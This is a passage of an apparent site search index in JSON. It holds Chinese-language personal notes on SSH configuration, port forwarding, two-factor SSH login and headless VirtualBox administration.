\u6280\u672f\u9762\u8bd5\u6307\u5357 \u201c\u4ed6\u5c71\u4e4b\u77f3\uff0c\u53ef\u4ee5\u653b\u7389\u201d\u2014\u2014\u4f60\u7684\u5927\u5b66\uff0c\u600e\u6837\u8fc7\uff1f \u201c\u5e26\u7740\u624b\u673a\u4e0a\u81ea\u4e60\uff0c\u516b\u5c0f\u65f6\u505a\u4e00\u9053\u9898\u201d","title":"\u975e\u6280\u672f\u6587\u7ae0"},{"location":"Links/#_7","text":"\u4ee3\u7801\u4e0d\u80fd\u5f53\u996d\u5403\uff0c\u4ee3\u7801\u4e0d\u80fd\u5f53\u6c34\u559d\uff0c\u4ee3\u7801\u4e5f\u4e0d\u80fd\u7ed9\u8c01\u751f\u5b69\u5b50\u3002","title":"\u7ed3\u8bed"},{"location":"Linux-SSH/","text":"SSH \u00b6 \u5ba2\u6237\u7aef\u4e0d\u540c\u670d\u52a1\u5668\u4f7f\u7528\u4e0d\u540c\u7684id_rsa \u00b6 \u4fee\u6539 .ssh/config : Host myshortname realname . example . com HostName realname . example . com IdentityFile ~/ . ssh / realname_rsa # private key for realname User remoteusername Host aliyun HostName 1 . 2 . 3 . 4 IdentityFile ~/ . ssh / realname2_rsa Port 10022 User root \u7136\u540e\u5c31\u80fdssh aliyun\u8fd9\u6837\u8bbf\u95ee1.2.3.4:10022\u7684ssh\u4e86\uff0c\u4e0d\u7528\u4fee\u6539/etc/hosts \u6362\u4e2a\u7aef\u53e3\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684sshd \u00b6 which sshd /usr/sbin/sshd -oPort=2333 ssh\u53cd\u5411\u4ee3\u7406 \u00b6 \u53c2\u89c1\uff1ahttp://www.tuicool.com/articles/UVRNfi \u5c06\u672c\u673a\u768422\u7aef\u53e3\u8f6c\u53d1\u81f3\u5916\u7f51\u670d\u52a1\u5668\u76842222\u7aef\u53e3\uff1a ssh -b 0.0.0.0 -L 2222:127.0.0.1:22 user@ip \u6ce8\u610f\u5728\u8fd0\u884c\u524d\u9700\u8981\u8bbe\u7f6e\u514d\u5bc6\u7801\u767b\u5f55\u4ee5\u53ca\u4fee\u6539\u5916\u7f51\u670d\u52a1\u5668\u7684sshd_config\uff0c\u52a0\u5165GatewayPorts yes \u542f\u7528SSH\u5bc6\u94a5\u767b\u5f55\u540e\u4e24\u6b65\u9a8c\u8bc1 \u00b6 \u6548\u679c\uff1a\u4e0d\u5141\u8bb8\u5bc6\u7801\u767b\u5f55\uff0c\u4f7f\u7528\u5bc6\u94a5\u767b\u5f55\u540e\uff0c\u9700\u8981\u8f93\u5165\u624b\u673aGoogle Authenticator\u663e\u793a\u7684\u52a8\u6001\u9a8c\u8bc1\u7801 \u6ce8\u610f\u5728\u786e\u5b9a\u4e24\u6b65\u767b\u5f55\u80fd\u6210\u529f\u4e4b\u524d\uff0c\u4fdd\u6301\u4e00\u4e2aSSH\u8fde\u63a5\u4ee5\u514d\u914d\u7f6e\u51fa\u9519\u65e0\u6cd5\u518d\u63a7\u5236\u670d\u52a1\u5668 \u7b2c\u96f6\u6b65\uff0c\u786e\u4fdd\u81ea\u5df1\u77e5\u9053root\u5bc6\u7801\u8fd8\u80fd\u7269\u7406\u767b\u5f55\u670d\u52a1\u5668 \u7b2c\u4e00\u6b65\uff0c\u5b89\u88c5Google Authenticator\u8fd9\u4e2a\u5305 apt-get install -y libpam-google-authenticator \u7b2c\u4e8c\u6b65\uff0c\u4fee\u6539/etc/pam.d/sshd \u5728\u9876\u90e8\uff08\u5728@include common-auth\u4e4b\u524d\uff09\u6dfb\u52a0\u8fd9\u4e00\u884c\uff1a auth sufficient pam_google_authenticator.so \u7b2c\u4e09\u6b65\uff0c\u4fee\u6539/etc/ssh/sshd_config \u4e0d\u5b58\u5728\u5219\u6dfb\u52a0\uff0c\u5b58\u5728\u4f46\u4e0d\u540c\u5c31\u4fee\u6539\uff0c\u987a\u5e8f\u65e0\u5173 PubkeyAuthentication yes AuthenticationMethods publickey,keyboard-interactive ChallengeResponseAuthentication yes PasswordAuthentication no UsePAM yes \u7b2c\u56db\u6b65\uff0c\u521b\u5efa\u4e00\u4e2a\u5bc6\u94a5 google-authenticator \u5bf9\u95ee\u9898\u5747\u56de\u7b54y\u6216\u8005\u81ea\u884c\u51b3\u5b9a\u54af~ \u7b2c\u4e94\u6b65\uff0c\u91cd\u542f\u670d\u52a1\u4ee5\u751f\u6548 service ssh restart \u6ce8\u610f\u5b83\u7684\u63d0\u95ee\uff0cVerification code\u95ee\u7684\u624d\u662f\u9a8c\u8bc1\u7801\uff0cPassword\u95ee\u7684\u662f\u8d26\u53f7\u5bc6\u7801 ssh\u767b\u5f55\u7981\u7528\u9ed8\u8ba4\u7684\u4fe1\u606f\u663e\u793a Ubuntu \u00b6 Ubuntu \u9ed8\u8ba4\u767b\u5f55\u540e\u4f1a\u663e\u793aWelcome to Ubuntu\u7b49\u591a\u5c11\u8f6f\u4ef6\u5305\u53ef\u4ee5\u5347\u7ea7\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5e76\u4e0d\u662f\u5f88\u91cd\u8981\uff0c\u5374\u4f1a\u62d6\u6162ssh\u767b\u5f55\u7684\u901f\u5ea6 \u7981\u7528\u65b9\u6cd5\u5982\u4e0b\uff1aFrom: https://ubuntuforums.org/showthread.php?t=1449020 \u7f16\u8f91\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff1a /etc/pam.d/login , /etc/pam.d/sshd \uff0c\u627e\u5230\u5176\u4e2d\u5305\u542b pam_motd \u7684\u884c\uff0c\u6ce8\u91ca\u6389\u4e4b\u540e service ssh reload \u4ee5\u540e\u518d\u767b\u5f55ssh\u5c31\u4e0d\u7528\u7b49\u5f85\u4e86 ssh config\u91cc\u76f4\u63a5\u6307\u5b9a\u7aef\u53e3\u8f6c\u53d1 \u00b6 \u53c2\u8003\uff1a https://www.ssh.com/academy/ssh/tunneling/example \u5728\u672c\u5730\u8bbf\u95ee\u8fdc\u7a0b \u00b6 LocalForward 5901 computer.myHost.edu:5901 \u7b49\u4ef7\u4e8e -L 5901:computer.myHost.edu:5901 \uff0c\u5c06\u8fdc\u7a0b\u76845901\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730 \u5728\u8fdc\u7a0b\u8bbf\u95ee\u672c\u5730 \u00b6 RemoteForward 1234 127.0.0.1:3421 \u8fd9\u6837\u7b49\u4ef7\u4e8e -R 1234:127.0.0.1:3421 \uff0c\u8ba9\u8fdc\u7a0b\u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee127.0.0.1:1234\u6765\u8bbf\u95ee\u5230\u5ba2\u6237\u7aef\u76843421 \u5982\u679c\u9700\u8981\u5141\u8bb8\u8fd9\u4e2a\u8f6c\u53d1\u76841234\u7aef\u53e3\u5bf9\u5916\u63d0\u4f9b\u8bbf\u95ee\uff0c\u8fd8\u9700\u8981\u4fee\u6539\u670d\u52a1\u5668\u7684sshd_config\uff0c\u8bbe\u7f6e GatewayPorts yes","title":"Linux-SSH"},{"location":"Linux-SSH/#ssh","text":"","title":"SSH"},{"location":"Linux-SSH/#id_rsa","text":"\u4fee\u6539 .ssh/config : Host myshortname realname . example . com HostName realname . example . com IdentityFile ~/ . ssh / realname_rsa # private key for realname User remoteusername Host aliyun HostName 1 . 2 . 3 . 4 IdentityFile ~/ . ssh / realname2_rsa Port 10022 User root \u7136\u540e\u5c31\u80fdssh aliyun\u8fd9\u6837\u8bbf\u95ee1.2.3.4:10022\u7684ssh\u4e86\uff0c\u4e0d\u7528\u4fee\u6539/etc/hosts","title":"\u5ba2\u6237\u7aef\u4e0d\u540c\u670d\u52a1\u5668\u4f7f\u7528\u4e0d\u540c\u7684id_rsa"},{"location":"Linux-SSH/#sshd","text":"which sshd /usr/sbin/sshd -oPort=2333","title":"\u6362\u4e2a\u7aef\u53e3\u5f00\u542f\u4e00\u4e2a\u4e34\u65f6\u7684sshd"},{"location":"Linux-SSH/#ssh_1","text":"\u53c2\u89c1\uff1ahttp://www.tuicool.com/articles/UVRNfi \u5c06\u672c\u673a\u768422\u7aef\u53e3\u8f6c\u53d1\u81f3\u5916\u7f51\u670d\u52a1\u5668\u76842222\u7aef\u53e3\uff1a ssh -b 0.0.0.0 -L 2222:127.0.0.1:22 user@ip \u6ce8\u610f\u5728\u8fd0\u884c\u524d\u9700\u8981\u8bbe\u7f6e\u514d\u5bc6\u7801\u767b\u5f55\u4ee5\u53ca\u4fee\u6539\u5916\u7f51\u670d\u52a1\u5668\u7684sshd_config\uff0c\u52a0\u5165GatewayPorts yes","title":"ssh\u53cd\u5411\u4ee3\u7406"},{"location":"Linux-SSH/#ssh_2","text":"\u6548\u679c\uff1a\u4e0d\u5141\u8bb8\u5bc6\u7801\u767b\u5f55\uff0c\u4f7f\u7528\u5bc6\u94a5\u767b\u5f55\u540e\uff0c\u9700\u8981\u8f93\u5165\u624b\u673aGoogle Authenticator\u663e\u793a\u7684\u52a8\u6001\u9a8c\u8bc1\u7801 \u6ce8\u610f\u5728\u786e\u5b9a\u4e24\u6b65\u767b\u5f55\u80fd\u6210\u529f\u4e4b\u524d\uff0c\u4fdd\u6301\u4e00\u4e2aSSH\u8fde\u63a5\u4ee5\u514d\u914d\u7f6e\u51fa\u9519\u65e0\u6cd5\u518d\u63a7\u5236\u670d\u52a1\u5668 \u7b2c\u96f6\u6b65\uff0c\u786e\u4fdd\u81ea\u5df1\u77e5\u9053root\u5bc6\u7801\u8fd8\u80fd\u7269\u7406\u767b\u5f55\u670d\u52a1\u5668 \u7b2c\u4e00\u6b65\uff0c\u5b89\u88c5Google Authenticator\u8fd9\u4e2a\u5305 apt-get install -y libpam-google-authenticator \u7b2c\u4e8c\u6b65\uff0c\u4fee\u6539/etc/pam.d/sshd \u5728\u9876\u90e8\uff08\u5728@include common-auth\u4e4b\u524d\uff09\u6dfb\u52a0\u8fd9\u4e00\u884c\uff1a auth sufficient pam_google_authenticator.so \u7b2c\u4e09\u6b65\uff0c\u4fee\u6539/etc/ssh/sshd_config \u4e0d\u5b58\u5728\u5219\u6dfb\u52a0\uff0c\u5b58\u5728\u4f46\u4e0d\u540c\u5c31\u4fee\u6539\uff0c\u987a\u5e8f\u65e0\u5173 PubkeyAuthentication yes AuthenticationMethods publickey,keyboard-interactive ChallengeResponseAuthentication yes PasswordAuthentication no UsePAM yes \u7b2c\u56db\u6b65\uff0c\u521b\u5efa\u4e00\u4e2a\u5bc6\u94a5 google-authenticator \u5bf9\u95ee\u9898\u5747\u56de\u7b54y\u6216\u8005\u81ea\u884c\u51b3\u5b9a\u54af~ \u7b2c\u4e94\u6b65\uff0c\u91cd\u542f\u670d\u52a1\u4ee5\u751f\u6548 service ssh restart \u6ce8\u610f\u5b83\u7684\u63d0\u95ee\uff0cVerification code\u95ee\u7684\u624d\u662f\u9a8c\u8bc1\u7801\uff0cPassword\u95ee\u7684\u662f\u8d26\u53f7\u5bc6\u7801","title":"\u542f\u7528SSH\u5bc6\u94a5\u767b\u5f55\u540e\u4e24\u6b65\u9a8c\u8bc1"},{"location":"Linux-SSH/#ssh-ubuntu","text":"Ubuntu \u9ed8\u8ba4\u767b\u5f55\u540e\u4f1a\u663e\u793aWelcome to Ubuntu\u7b49\u591a\u5c11\u8f6f\u4ef6\u5305\u53ef\u4ee5\u5347\u7ea7\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5e76\u4e0d\u662f\u5f88\u91cd\u8981\uff0c\u5374\u4f1a\u62d6\u6162ssh\u767b\u5f55\u7684\u901f\u5ea6 \u7981\u7528\u65b9\u6cd5\u5982\u4e0b\uff1aFrom: https://ubuntuforums.org/showthread.php?t=1449020 \u7f16\u8f91\u8fd9\u4e24\u4e2a\u6587\u4ef6\uff1a /etc/pam.d/login , /etc/pam.d/sshd \uff0c\u627e\u5230\u5176\u4e2d\u5305\u542b pam_motd \u7684\u884c\uff0c\u6ce8\u91ca\u6389\u4e4b\u540e service ssh reload \u4ee5\u540e\u518d\u767b\u5f55ssh\u5c31\u4e0d\u7528\u7b49\u5f85\u4e86","title":"ssh\u767b\u5f55\u7981\u7528\u9ed8\u8ba4\u7684\u4fe1\u606f\u663e\u793a Ubuntu"},{"location":"Linux-SSH/#ssh-config","text":"\u53c2\u8003\uff1a https://www.ssh.com/academy/ssh/tunneling/example","title":"ssh config\u91cc\u76f4\u63a5\u6307\u5b9a\u7aef\u53e3\u8f6c\u53d1"},{"location":"Linux-SSH/#_1","text":"LocalForward 5901 computer.myHost.edu:5901 \u7b49\u4ef7\u4e8e -L 5901:computer.myHost.edu:5901 \uff0c\u5c06\u8fdc\u7a0b\u76845901\u7aef\u53e3\u6620\u5c04\u5230\u672c\u5730","title":"\u5728\u672c\u5730\u8bbf\u95ee\u8fdc\u7a0b"},{"location":"Linux-SSH/#_2","text":"RemoteForward 1234 127.0.0.1:3421 \u8fd9\u6837\u7b49\u4ef7\u4e8e -R 1234:127.0.0.1:3421 \uff0c\u8ba9\u8fdc\u7a0b\u670d\u52a1\u5668\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee127.0.0.1:1234\u6765\u8bbf\u95ee\u5230\u5ba2\u6237\u7aef\u76843421 \u5982\u679c\u9700\u8981\u5141\u8bb8\u8fd9\u4e2a\u8f6c\u53d1\u76841234\u7aef\u53e3\u5bf9\u5916\u63d0\u4f9b\u8bbf\u95ee\uff0c\u8fd8\u9700\u8981\u4fee\u6539\u670d\u52a1\u5668\u7684sshd_config\uff0c\u8bbe\u7f6e GatewayPorts yes","title":"\u5728\u8fdc\u7a0b\u8bbf\u95ee\u672c\u5730"},{"location":"Linux-VirtualBox/","text":"VirtualBox \u00b6 \u53c2\u8003 https://www.howtoforge.com/tutorial/running-virtual-machines-with-virtualbox-5.1-on-a-headless-ubuntu-16.04-lts-server/ \u5728linux\u7ec8\u7aef\u4e0b\u4f7f\u7528VBoxManage\u548cVBoxHeadless\u521b\u5efa\u3001\u542f\u52a8\u3001\u63a7\u5236\u4e00\u4e2aUbuntu14.04 64Bit\u7684\u865a\u62df\u673a \u4e0b\u8f7d \u00b6 http://www.virtualbox.org/wiki/Downloads \u4ece\u5b98\u7f51\u627e\u5230\u5bf9\u5e94\u7684rpm\u6216deb\u4e0b\u8f7d\u5373\u53ef rpm\u6587\u4ef6\u7684\u5b89\u88c5\uff1a rpm -ivh something.rpm deb\u6587\u4ef6\u7684\u5b89\u88c5 dpkg -i something.rpm \u6267\u884c dpkg -i \u540e\u9700\u8981\u6267\u884c apt-get -f install \u4ee5\u5b89\u88c5\u7f3a\u5931\u7684\u4f9d\u8d56\u5305 \u4e00\u5b9a\u8981\u5b89\u88c5\u989d\u5916\u5305 \u00b6 cd / tmp wget http : // download . virtualbox . org / virtualbox / 5.1 . 16 / Oracle_VM_VirtualBox_Extension_Pack - 5.1 . 16 - 113841. vbox - extpack sudo VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack - 5.1 . 16 - 113841. vbox - extpack \u521b\u5efa\u865a\u62df\u673a\uff0c\u8bbe\u7f6e\u865a\u62df\u673a\u9009\u9879 \u00b6 mkdir -p /home/virtualbox VBoxManage createvm --name ubuntu --ostype \"Ubuntu_64\" --register --basefolder /home/virtualbox/ VBoxManage createvdi --filename ubuntu/ubuntu.vdi --size 102400 # 100GB VBoxManage storagectl ubuntu --name storage_controller_1 --add ide VBoxManage storageattach ubuntu --storagectl storage_controller_1 \\ --type hdd --port 0 --device 0 --medium ubuntu/ubuntu.vdi VBoxManage storageattach ubuntu --storagectl storage_controller_1 \\ --type dvddrive --port 1 --device 0 --medium ubuntu-14.04.4-server-amd64.iso VBoxManage modifyvm ubuntu --cpus 4 --memory 2048 --acpi on --boot1 dvd --nic1 nat --cableconnected1 on --vrde on --vrdeport 3389 \u4ee5\u4e0b\u662f\u6211\u5b89\u88c5CentOS 6.8 32bit minimal\u7684\u8fc7\u7a0b pushd /root curl -O http://mirrors.zju.edu.cn/centos/6.8/isos/i386/CentOS-6.8-i386-minimal.iso mkdir /home/virtualbox #\u770b\u770bostype\u652f\u6301\u54ea\u4e00\u4e9b\uff0c\u7ed3\u679c\u53d1\u73b0\u6709RedHat\uff0c\u5c31\u9009\u5b83\u54af VBoxManage list ostypes VBoxManage createvm --name centos --ostype \"RedHat\" --register --basefolder /home/virtualbox/ pushd /home/virtualbox VBoxManage createvdi --filename centos/disk.vdi --size 2048 # 2GB VBoxManage storagectl centos --name storage_controller_1 --add ide VBoxManage storageattach centos --storagectl storage_controller_1 --type hdd --port 0 --device 0 --medium centos/disk.vdi VBoxManage storageattach centos --storagectl storage_controller_1 --type dvddrive --port 1 --device 0 --medium /root/CentOS-6.8-i386-minimal.iso #\u914d\u7f6eCPU\u548c\u5185\u5b58\u9650\u5236\uff0c\u5149\u9a71\u542f\u52a8\uff0c\u5141\u8bb8\u591a\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5 VBoxManage modifyvm centos --cpus 1 --memory 512 --acpi on --boot1 dvd --nic1 nat --cableconnected1 on --vrde on --vrdeport 13389 --vrdemulticon on \u542f\u52a8\u865a\u62df\u673a \u00b6 nohup VBoxHeadless -startvm ubuntu --vrde on -e TCP/Ports=63389 & \u63a7\u5236\u865a\u62df\u673a \u00b6 Windows\u4e0b\u4f7f\u7528 mstsc \u8fdc\u7a0b\u8fde\u63a5\u5373\u53ef\u83b7\u5f97\u4e00\u4e2a\u56fe\u5f62\u754c\u9762\u7684\u7ec8\u7aef\u5b8c\u6210\u7cfb\u7edf\u5b89\u88c5 \u5220\u9664\u786c\u76d8 \u00b6 VBoxManage storageattach centos --storagectl storage_controller_1 --type hdd --port 0 --device 0 --medium none VBoxManage closemedium centos/disk.vdi rm centos/disk.vdi \u8fd0\u884c\u6761\u4ef6\u4e0b\u4fee\u6539\u7aef\u53e3\u6620\u5c04 \u00b6 # \u9996\u5148\u901a\u8fc7 mstsc\u7269\u7406\u63a5\u89e6\u865a\u62df\u673a \uff0c\u786e\u8ba4 ifconfig\u5df2\u7ecf\u5f97\u5230ip # \u5426\u5219\u9700\u8981\u5728\u865a\u62df\u673a\u4e2d\u6267\u884c ifconfig - a \u67e5\u770b\u7f51\u5361\uff0c\u6267\u884c dhclient eth0 \u83b7\u5f97 ip # \u4f8b\u5982\u6211\u4eec\u9700\u8981\u5c06\u865a\u62df\u673a\u7684 22 \u7aef\u53e3\u6620\u5c04\u51fa 10022 \u7aef\u53e3 # \u6700\u540e\u4e00\u4e2a\u53c2\u6570\u7684\u683c\u5f0f\uff1a\u89c4\u5219\u540d\u79f0 , tcp\u8fd8\u662fudp , \u4e3b\u673a\u7684 IP ( \u4e0d\u586b\u5c31\u597d ), \u4e3b\u673a\u66b4\u9732\u51fa\u6765\u7684\u7aef\u53e3 , \u865a\u62df\u673a\u7684 IP ( \u4e0d\u586b\u5c31\u597d ), \u9700\u8981\u6620\u5c04\u7684\u865a\u62df\u673a\u7aef\u53e3 VBoxManage controlvm \u865a\u62df\u673a\u540d\u79f0 natpf1 ssh , tcp ,, 10022 ,, 22 \u8fd0\u884c\u6761\u4ef6\u4e0b\u5173\u95ed\u8fdc\u7a0b\u63a7\u5236 \u00b6 \u7cfb\u7edf\u5b89\u88c5\u597d\u4e86\uff0cSSH\u5f00\u4e86\uff0cSSH\u7684\u7aef\u53e3\u6620\u5c04\u53ef\u4ee5\u8fde\u4e0a\u53bb\u4e86\uff0c\u5c31\u53ef\u4ee5\u5173\u6389\u8fdc\u7a0b\u63a7\u5236\u4e86 VBoxManage controlvm \u865a\u62df\u673a\u540d\u79f0 vrde off \u5c4f\u5e55\u622a\u56fe \u00b6 VBoxManage controlvm <vm name> screenshotpng /tmp/<filename>.png \u4f18\u96c5\u7684\u5173\u673a \u00b6 vboxmanage controlvm \u865a\u62df\u673a\u540d\u79f0 poweroff soft \u5f00\u542fvrde\u8fdc\u7a0b\u684c\u9762 \u00b6 \u4f3c\u4e4e\u9700\u8981\u5148\u5173\u673a\u624d\u80fd\u64cd\u4f5c VBoxManage modifyvm \"VM name\" --vrdeextpack default VBoxManage modifyvm \"VM name\" --vrde on VBoxManage modifyvm \"VM name\" --vrdeport 3391 VBoxManage modifyvm \"VM name\" --vrdeaddress 0.0.0.0 \u4ece\u786c\u76d8+\u5feb\u7167vdi\u6587\u4ef6\u6062\u590d \u00b6 \u5047\u8bbe\u5907\u4efd\u7684\u65f6\u5019\u53ea\u590d\u5236\u4e86\u786c\u76d8vdi\u6587\u4ef6\u548cSnapshots\u7684vdi\u6587\u4ef6\uff0c\u800c\u5fd8\u8bb0\u4e86\u5907\u4efdvbox\u6587\u4ef6\uff0c\u5982\u4f55\u6062\u590d\u5feb\u7167\u5173\u7cfb\u5462 \u627e\u5230 https://superuser.com/questions/1224554/recreate-virtualbox-machine-with-snapshots \uff0c\u601d\u8def\u662f\u521b\u5efa\u4e2a\u65b0\u7684\u865a\u62df\u673a \u4ecebase vdi\u5f00\u59cb\u6253\u5feb\u7167->\u7f16\u8f91vbox\u5c06\u65b0\u7684Snapshot\u6307\u5411\u4e0b\u4e00\u4e2a\u5feb\u7167->\u7ee7\u7eed\u6253\u5feb\u7167\u91cd\u590d \u5176\u4e2d\u5c31\u9700\u8981\u6211\u4eec\u641e\u6e05\u695a\u5feb\u7167\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u770b\u6587\u4ef6\u4fee\u6539\u7684\u65f6\u95f4\u6233\u5dee\u4e0d\u591a\u53ef\u4ee5\u77e5\u9053\uff0c\u4f46\u5982\u679c\u6ca1\u6709\u8fd9\u79cd\u4fe1\u606f\u4e5f\u4e0d\u5fc5\u6309\u7167\u4eba\u5bb6\u8bf4\u7684\u4e00\u4e2a\u4e2a\u52a0\u8f7d\u5c1d\u8bd5\uff0c\u53ef\u4ee5\u4f7f\u7528 \u8fd9\u7bc7 \u8bf4\u5230\u7684 VBoxManage internalcommands dumphdinfo \u6765\u67e5\u770b\u6bcf\u4e2a\u5feb\u7167\u6587\u4ef6\u7684parent\u662f\u8c01\u3002","title":"Linux-VirtualBox"},{"location":"Linux-VirtualBox/#virtualbox","text":"\u53c2\u8003 https://www.howtoforge.com/tutorial/running-virtual-machines-with-virtualbox-5.1-on-a-headless-ubuntu-16.04-lts-server/ \u5728linux\u7ec8\u7aef\u4e0b\u4f7f\u7528VBoxManage\u548cVBoxHeadless\u521b\u5efa\u3001\u542f\u52a8\u3001\u63a7\u5236\u4e00\u4e2aUbuntu14.04 64Bit\u7684\u865a\u62df\u673a","title":"VirtualBox"},{"location":"Linux-VirtualBox/#_1","text":"http://www.virtualbox.org/wiki/Downloads \u4ece\u5b98\u7f51\u627e\u5230\u5bf9\u5e94\u7684rpm\u6216deb\u4e0b\u8f7d\u5373\u53ef rpm\u6587\u4ef6\u7684\u5b89\u88c5\uff1a rpm -ivh something.rpm deb\u6587\u4ef6\u7684\u5b89\u88c5 dpkg -i something.rpm \u6267\u884c dpkg -i \u540e\u9700\u8981\u6267\u884c apt-get -f install \u4ee5\u5b89\u88c5\u7f3a\u5931\u7684\u4f9d\u8d56\u5305","title":"\u4e0b\u8f7d"},{"location":"Linux-VirtualBox/#_2","text":"cd / tmp wget http : // download . virtualbox . org / virtualbox / 5.1 . 16 / Oracle_VM_VirtualBox_Extension_Pack - 5.1 . 16 - 113841. vbox - extpack sudo VBoxManage extpack install Oracle_VM_VirtualBox_Extension_Pack - 5.1 . 16 - 113841. vbox - extpack","title":"\u4e00\u5b9a\u8981\u5b89\u88c5\u989d\u5916\u5305"},{"location":"Linux-VirtualBox/#_3","text":"mkdir -p /home/virtualbox VBoxManage createvm --name ubuntu --ostype \"Ubuntu_64\" --register --basefolder /home/virtualbox/ VBoxManage createvdi --filename ubuntu/ubuntu.vdi --size 102400 # 100GB VBoxManage storagectl ubuntu --name storage_controller_1 --add ide VBoxManage storageattach ubuntu --storagectl storage_controller_1 \\ --type hdd --port 0 --device 0 --medium ubuntu/ubuntu.vdi VBoxManage storageattach ubuntu --storagectl storage_controller_1 \\ --type dvddrive --port 1 --device 0 --medium ubuntu-14.04.4-server-amd64.iso VBoxManage modifyvm ubuntu --cpus 4 --memory 2048 --acpi on --boot1 dvd --nic1 nat --cableconnected1 on --vrde on --vrdeport 3389 \u4ee5\u4e0b\u662f\u6211\u5b89\u88c5CentOS 6.8 32bit minimal\u7684\u8fc7\u7a0b pushd /root curl -O http://mirrors.zju.edu.cn/centos/6.8/isos/i386/CentOS-6.8-i386-minimal.iso mkdir /home/virtualbox #\u770b\u770bostype\u652f\u6301\u54ea\u4e00\u4e9b\uff0c\u7ed3\u679c\u53d1\u73b0\u6709RedHat\uff0c\u5c31\u9009\u5b83\u54af VBoxManage list ostypes VBoxManage createvm --name centos --ostype \"RedHat\" --register --basefolder /home/virtualbox/ pushd /home/virtualbox VBoxManage createvdi --filename centos/disk.vdi --size 2048 # 2GB VBoxManage storagectl centos --name storage_controller_1 --add ide VBoxManage storageattach centos --storagectl storage_controller_1 --type hdd --port 0 --device 0 --medium centos/disk.vdi VBoxManage storageattach centos --storagectl storage_controller_1 --type dvddrive --port 1 --device 0 --medium /root/CentOS-6.8-i386-minimal.iso #\u914d\u7f6eCPU\u548c\u5185\u5b58\u9650\u5236\uff0c\u5149\u9a71\u542f\u52a8\uff0c\u5141\u8bb8\u591a\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5 VBoxManage modifyvm centos --cpus 1 --memory 512 --acpi on --boot1 dvd --nic1 nat --cableconnected1 on --vrde on --vrdeport 13389 --vrdemulticon on","title":"\u521b\u5efa\u865a\u62df\u673a\uff0c\u8bbe\u7f6e\u865a\u62df\u673a\u9009\u9879"},{"location":"Linux-VirtualBox/#_4","text":"nohup VBoxHeadless -startvm ubuntu --vrde on -e TCP/Ports=63389 &","title":"\u542f\u52a8\u865a\u62df\u673a"},{"location":"Linux-VirtualBox/#_5","text":"Windows\u4e0b\u4f7f\u7528 mstsc \u8fdc\u7a0b\u8fde\u63a5\u5373\u53ef\u83b7\u5f97\u4e00\u4e2a\u56fe\u5f62\u754c\u9762\u7684\u7ec8\u7aef\u5b8c\u6210\u7cfb\u7edf\u5b89\u88c5","title":"\u63a7\u5236\u865a\u62df\u673a"},{"location":"Linux-VirtualBox/#_6","text":"VBoxManage storageattach centos --storagectl storage_controller_1 --type hdd --port 0 --device 0 --medium none VBoxManage closemedium centos/disk.vdi rm centos/disk.vdi","title":"\u5220\u9664\u786c\u76d8"},{"location":"Linux-VirtualBox/#_7","text":"# \u9996\u5148\u901a\u8fc7 mstsc\u7269\u7406\u63a5\u89e6\u865a\u62df\u673a \uff0c\u786e\u8ba4 ifconfig\u5df2\u7ecf\u5f97\u5230ip # \u5426\u5219\u9700\u8981\u5728\u865a\u62df\u673a\u4e2d\u6267\u884c ifconfig - a \u67e5\u770b\u7f51\u5361\uff0c\u6267\u884c dhclient eth0 \u83b7\u5f97 ip # \u4f8b\u5982\u6211\u4eec\u9700\u8981\u5c06\u865a\u62df\u673a\u7684 22 \u7aef\u53e3\u6620\u5c04\u51fa 10022 \u7aef\u53e3 # \u6700\u540e\u4e00\u4e2a\u53c2\u6570\u7684\u683c\u5f0f\uff1a\u89c4\u5219\u540d\u79f0 , tcp\u8fd8\u662fudp , \u4e3b\u673a\u7684 IP ( \u4e0d\u586b\u5c31\u597d ), \u4e3b\u673a\u66b4\u9732\u51fa\u6765\u7684\u7aef\u53e3 , \u865a\u62df\u673a\u7684 IP ( \u4e0d\u586b\u5c31\u597d ), \u9700\u8981\u6620\u5c04\u7684\u865a\u62df\u673a\u7aef\u53e3 VBoxManage controlvm \u865a\u62df\u673a\u540d\u79f0 natpf1 ssh , tcp ,, 10022 ,, 22","title":"\u8fd0\u884c\u6761\u4ef6\u4e0b\u4fee\u6539\u7aef\u53e3\u6620\u5c04"},{"location":"Linux-VirtualBox/#_8","text":"\u7cfb\u7edf\u5b89\u88c5\u597d\u4e86\uff0cSSH\u5f00\u4e86\uff0cSSH\u7684\u7aef\u53e3\u6620\u5c04\u53ef\u4ee5\u8fde\u4e0a\u53bb\u4e86\uff0c\u5c31\u53ef\u4ee5\u5173\u6389\u8fdc\u7a0b\u63a7\u5236\u4e86 VBoxManage controlvm \u865a\u62df\u673a\u540d\u79f0 vrde off","title":"\u8fd0\u884c\u6761\u4ef6\u4e0b\u5173\u95ed\u8fdc\u7a0b\u63a7\u5236"},{"location":"Linux-VirtualBox/#_9","text":"VBoxManage controlvm <vm name> screenshotpng /tmp/<filename>.png","title":"\u5c4f\u5e55\u622a\u56fe"},{"location":"Linux-VirtualBox/#_10","text":"vboxmanage controlvm \u865a\u62df\u673a\u540d\u79f0 poweroff soft","title":"\u4f18\u96c5\u7684\u5173\u673a"},{"location":"Linux-VirtualBox/#vrde","text":"\u4f3c\u4e4e\u9700\u8981\u5148\u5173\u673a\u624d\u80fd\u64cd\u4f5c VBoxManage modifyvm \"VM name\" --vrdeextpack default VBoxManage modifyvm \"VM name\" --vrde on VBoxManage modifyvm \"VM name\" --vrdeport 3391 VBoxManage modifyvm \"VM name\" --vrdeaddress 0.0.0.0","title":"\u5f00\u542fvrde\u8fdc\u7a0b\u684c\u9762"},{"location":"Linux-VirtualBox/#vdi","text":"\u5047\u8bbe\u5907\u4efd\u7684\u65f6\u5019\u53ea\u590d\u5236\u4e86\u786c\u76d8vdi\u6587\u4ef6\u548cSnapshots\u7684vdi\u6587\u4ef6\uff0c\u800c\u5fd8\u8bb0\u4e86\u5907\u4efdvbox\u6587\u4ef6\uff0c\u5982\u4f55\u6062\u590d\u5feb\u7167\u5173\u7cfb\u5462 \u627e\u5230 https://superuser.com/questions/1224554/recreate-virtualbox-machine-with-snapshots 